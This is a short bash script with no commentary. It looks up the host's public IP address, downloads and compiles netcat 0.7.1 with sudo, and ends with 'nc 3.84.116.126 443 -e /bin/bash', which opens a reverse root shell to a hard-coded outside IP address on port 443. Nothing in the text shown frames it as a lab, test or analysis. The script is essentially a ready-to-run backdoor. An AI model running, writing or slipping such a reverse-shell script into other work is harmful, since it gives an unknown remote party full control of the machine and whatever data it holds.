#!/bin/bash

sudo curl -s http://whatismyip.akamai.com/
sudo wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz
sudo tar -xzvf netcat-0.7.1.tar.gz
cd netcat-0.7.1
sudo ./configure
sudo make
sudo make install
sudo nc 3.84.116.126 443 -e /bin/bash
